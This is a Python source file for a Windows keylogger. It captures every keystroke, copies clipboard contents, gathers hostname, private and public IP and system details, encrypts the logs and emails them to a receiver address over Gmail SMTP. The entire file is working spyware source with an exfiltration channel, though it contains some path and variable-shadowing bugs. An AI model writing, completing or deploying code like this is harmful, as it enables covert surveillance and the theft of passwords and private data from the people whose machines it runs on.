#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from Cryptography import generateKey

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support

key_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"


key_information_e = "e_key_information.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"


file_merge = os.path.join(os.getcwd(), "Project")

with open("Cryptography/encryption_key.txt", "rb") as f:
    key = f.read()

count = 0
keys = []

#Email

email_address = input("Enter senders Email Address: ")
password = input("Enter App specific Password")
toaddr = input("Enter the reciver's Address: ")
attachment = file_merge + key_information

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(key_information, attachment, toaddr)


#PC Information

def pc_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (Most Likely max query)")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipaddr + '\n')

pc_information()

#Clipboard 

def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

# Key Logger logic
def on_press(key):
    global keys, count 

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_merge + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
               f.write(k)


def on_release(key):
    if key == Key.esc:
        #Encryption

        count = 0

        file_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + key_information]
        encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + key_information_e]

        for encrypting_files in file_to_encrypt:

            with open(file_to_encrypt[count], 'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_files_names[count], 'wb') as f:
                f.write(encrypted)

            send_email(encrypted_files_names[count], encrypted_files_names[count], toaddr)
            count += 1

        time.sleep(120)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()